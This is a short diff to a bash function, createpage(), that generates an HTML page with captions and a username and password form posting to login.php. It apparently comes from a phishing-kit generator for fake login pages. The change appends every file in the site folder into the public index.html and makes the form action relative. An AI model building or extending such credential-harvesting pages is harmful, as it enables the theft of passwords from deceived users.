@@ -46,8 +46,16 @@ createpage() {
     echo "<body bgcolor=\"gray\" text=\"white\">" >> "$site_folder/index.html"
     IFS=$'\n'
     printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$default_cap1" "$default_cap2" >> "$site_folder/index.html"
+    
+    for file in "$site_folder"/*; do
+      if [ -f "$file" ]; then
+        cat "$file" >> "$site_folder/index.html"
+        printf '<br>\n' >> "$site_folder/index.html"
+      fi
+    done
+    
     IFS=$'\n'
-    printf '<form method="POST" action="%s"><label>%s </label>\n' "$site_name/login.php" "$user_text" >> "$site_folder/index.html"
+    printf '<form method="POST" action="%s"><label>%s </label>\n' "login.php" "$user_text" >> "$site_folder/index.html"
     IFS=$'\n'
     printf '<br><label>%s: </label>' "$default_pass_text" >> "$site_folder/index.html"
     IFS=$'\n'
